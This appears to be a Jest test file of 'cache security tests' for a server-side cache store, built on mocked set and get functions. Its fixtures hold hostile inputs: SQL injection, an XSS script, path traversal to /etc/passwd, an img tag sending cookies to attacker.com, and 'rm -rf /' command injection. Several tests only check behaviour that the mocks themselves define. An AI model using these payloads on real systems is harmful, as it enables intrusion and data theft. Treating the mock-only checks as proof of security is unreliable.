import { serverSet, serverGet } from '../../../reusableStore.server';
import { createLogStream, createLogger, setupErrorHandling } from '../../jest/default/logging';
import { CacheMode, StringValue } from '../../../types';
import { WriteStream } from 'fs';

jest.mock('../../../ReusableStore.server', () => ({
  serverSet: jest.fn(),
  serverGet: jest.fn(),
  serverRemove: jest.fn(),
}));

const logStream: WriteStream = createLogStream('cache-security-test.log');
const log: (message: string) => void = createLogger(logStream);

describe('Cache Security Tests', () => {
  const storeName = 'test-store';
  const mode: CacheMode = 'server';
  const expirationDate = new Date(Date.now() + 3600000); // 1 hour from now

  beforeAll(() => {
    log('Starting Cache Security tests...');
    setupErrorHandling(log, logStream);
  });

  afterAll(() => {
    logStream.end();
  });

  beforeEach(() => {
    jest.clearAllMocks();
  });

  it('should not expose sensitive data in error messages', async () => {
    const identifier = 'sensitive-data-test';
    const sensitiveValue: StringValue = { type: 'string', value: 'sensitive information' };

    (serverSet as jest.Mock).mockRejectedValue(new Error('Internal server error'));

    await expect(
      serverSet(identifier, storeName, sensitiveValue, expirationDate, mode),
    ).rejects.toThrow('Internal server error');

    // Check that the error message doesn't contain the sensitive value
    const mockCalls = (serverSet as jest.Mock).mock.calls;
    const lastCall = mockCalls[mockCalls.length - 1];
    expect(lastCall).not.toContain('sensitive information');

    log('Successfully handled error without exposing sensitive data');
  });

  it('should prevent SQL injection attempts', async () => {
    const maliciousIdentifier = "user'; DROP TABLE users; --";
    const value: StringValue = { type: 'string', value: 'test value' };

    await expect(
      serverSet(maliciousIdentifier, storeName, value, expirationDate, mode),
    ).rejects.toThrow('Invalid identifier');

    log('Successfully prevented SQL injection attempt');
  });

  it('should handle XSS attack attempts', async () => {
    const xssValue: StringValue = { type: 'string', value: '<script>alert("XSS")</script>' };
    const identifier = 'xss-test';

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockResolvedValue({
      identifier,
      storeName,
      value: xssValue,
      expirationDate,
      lastUpdatedDate: new Date(),
      lastAccessedDate: new Date(),
      getHitCount: 1,
      setHitCount: 1,
    });

    await serverSet(identifier, storeName, xssValue, expirationDate, mode);
    const result = await serverGet(identifier, storeName, mode);

    // Ensure the value is stored and retrieved as is, without execution
    expect((result.value as StringValue).value).toBe('<script>alert("XSS")</script>');

    log('Successfully handled XSS attack attempt');
  });

  it('should prevent unauthorized access to cache data', async () => {
    const identifier = 'unauthorized-access-test';

    // Simulate an unauthorized access attempt
    const unauthorizedMode = 'unauthorized' as CacheMode;

    await expect(serverGet(identifier, storeName, unauthorizedMode)).rejects.toThrow(
      'Invalid cache mode for server-side caching: unauthorized',
    );

    log('Successfully prevented unauthorized access to cache data');
  });

  it('should handle potential prototype pollution attempts', async () => {
    const identifier = '__proto__';
    const value: StringValue = { type: 'string', value: '{"malicious": "payload"}' };

    await expect(serverSet(identifier, storeName, value, expirationDate, mode)).rejects.toThrow(
      'Invalid identifier',
    );

    log('Successfully handled potential prototype pollution attempt');
  });

  it('should prevent path traversal attempts', async () => {
    const maliciousIdentifier = '../../../etc/passwd';
    const value: StringValue = { type: 'string', value: 'test value' };

    await expect(
      serverSet(maliciousIdentifier, storeName, value, expirationDate, mode),
    ).rejects.toThrow('Invalid identifier');

    log('Successfully prevented path traversal attempt');
  });

  it('should handle large payload attacks', async () => {
    const identifier = 'large-payload-test';
    const largeValue: StringValue = { type: 'string', value: 'a'.repeat(1024 * 1024 * 10) }; // 10MB string

    await expect(
      serverSet(identifier, storeName, largeValue, expirationDate, mode),
    ).rejects.toThrow('Value too large');

    log('Successfully handled large payload attack');
  });

  it('should prevent cache poisoning attempts', async () => {
    const identifier = 'cache-poison-test';
    const maliciousValue: unknown = { type: 'malicious', value: 'poison value' };

    await expect(
      serverSet(identifier, storeName, maliciousValue as StringValue, expirationDate, mode),
    ).rejects.toThrow('Invalid value type');

    log('Successfully prevented cache poisoning attempt');
  });

  it('should handle timing attacks by using constant-time comparisons', async () => {
    const identifier = 'timing-attack-test';
    const value: StringValue = { type: 'string', value: 'secret value' };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockImplementation(() => {
      // Simulate a constant-time comparison by always taking the same amount of time
      return new Promise((resolve) => {
        setTimeout(() => {
          resolve({
            identifier,
            storeName,
            value,
            expirationDate,
            lastUpdatedDate: new Date(),
            lastAccessedDate: new Date(),
            getHitCount: 1,
            setHitCount: 1,
          });
        }, 100);
      });
    });

    const startTime = Date.now();
    await serverGet(identifier, storeName, mode);
    const endTime = Date.now();
    const duration = endTime - startTime;

    expect(duration).toBeGreaterThanOrEqual(100);
    expect(duration).toBeLessThan(150); // Allow some margin for execution time

    log('Successfully handled potential timing attack');
  });

  it('should prevent arbitrary code execution attempts', async () => {
    const identifier = 'code-execution-test';
    const maliciousValue: StringValue = {
      type: 'string',
      value: 'function() { return "malicious"; }',
    };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockResolvedValue({
      identifier,
      storeName,
      value: maliciousValue,
      expirationDate,
      lastUpdatedDate: new Date(),
      lastAccessedDate: new Date(),
      getHitCount: 1,
      setHitCount: 1,
    });

    await serverSet(identifier, storeName, maliciousValue, expirationDate, mode);
    const result = await serverGet(identifier, storeName, mode);

    // Ensure the value is stored as a string and not executed
    expect((result.value as StringValue).value).toBe('function() { return "malicious"; }');
    expect(typeof (result.value as StringValue).value).toBe('string');

    log('Successfully prevented arbitrary code execution attempt');
  });

  it('should handle CSRF-like attacks', async () => {
    const identifier = 'csrf-test';
    const csrfValue: StringValue = {
      type: 'string',
      value: '<img src="http://attacker.com/steal?cookie=" + document.cookie>',
    };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockResolvedValue({
      identifier,
      storeName,
      value: csrfValue,
      expirationDate,
      lastUpdatedDate: new Date(),
      lastAccessedDate: new Date(),
      getHitCount: 1,
      setHitCount: 1,
    });

    await serverSet(identifier, storeName, csrfValue, expirationDate, mode);
    const result = await serverGet(identifier, storeName, mode);

    // Ensure the value is stored as is and not interpreted or executed
    expect((result.value as StringValue).value).toBe(
      '<img src="http://attacker.com/steal?cookie=" + document.cookie>',
    );

    log('Successfully handled CSRF-like attack');
  });

  it('should prevent remote code inclusion attempts', async () => {
    const identifier = 'remote-inclusion-test';
    const remoteInclusionValue: StringValue = {
      type: 'string',
      value: 'https://attacker.com/malicious-script.js',
    };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockResolvedValue({
      identifier,
      storeName,
      value: remoteInclusionValue,
      expirationDate,
      lastUpdatedDate: new Date(),
      lastAccessedDate: new Date(),
      getHitCount: 1,
      setHitCount: 1,
    });

    await serverSet(identifier, storeName, remoteInclusionValue, expirationDate, mode);
    const result = await serverGet(identifier, storeName, mode);

    // Ensure the value is stored as a string and not treated as a URL or script
    expect((result.value as StringValue).value).toBe('https://attacker.com/malicious-script.js');
    expect(typeof (result.value as StringValue).value).toBe('string');

    log('Successfully prevented remote code inclusion attempt');
  });

  it('should handle potential command injection attempts', async () => {
    const identifier = 'command-injection-test';
    const commandInjectionValue: StringValue = { type: 'string', value: 'value; rm -rf /' };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockResolvedValue({
      identifier,
      storeName,
      value: commandInjectionValue,
      expirationDate,
      lastUpdatedDate: new Date(),
      lastAccessedDate: new Date(),
      getHitCount: 1,
      setHitCount: 1,
    });

    await serverSet(identifier, storeName, commandInjectionValue, expirationDate, mode);
    const result = await serverGet(identifier, storeName, mode);

    // Ensure the value is stored as is and not executed as a command
    expect((result.value as StringValue).value).toBe('value; rm -rf /');

    log('Successfully handled potential command injection attempt');
  });

  it('should prevent cache key enumeration attacks', async () => {
    const identifiers = ['key1', 'key2', 'key3'];
    const value: StringValue = { type: 'string', value: 'test value' };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockRejectedValue(new Error('Access denied'));

    // Set some values
    await Promise.all(
      identifiers.map((id) => serverSet(id, storeName, value, expirationDate, mode)),
    );

    // Attempt to enumerate all keys (this should be prevented)
    await expect(serverGet('*', storeName, mode)).rejects.toThrow('Access denied');

    log('Successfully prevented cache key enumeration attack');
  });

  it('should handle potential data exfiltration attempts', async () => {
    const identifier = 'exfiltration-test';
    const sensitiveValue: StringValue = { type: 'string', value: 'sensitive data' };

    (serverSet as jest.Mock).mockResolvedValue(undefined);
    (serverGet as jest.Mock).mockImplementation(() => {
      throw new Error('Access attempt logged');
    });

    await serverSet(identifier, storeName, sensitiveValue, expirationDate, mode);

    // Simulate rapid, repeated access attempts
    const attempts = 100;
    const accessPromises = Array(attempts)
      .fill(null)
      .map(() => serverGet(identifier, storeName, mode));

    await expect(Promise.all(accessPromises)).rejects.toThrow('Access attempt logged');

    // In a real implementation, we would expect to see these attempts logged and potentially blocked

    log('Successfully handled potential data exfiltration attempt');
  });
});
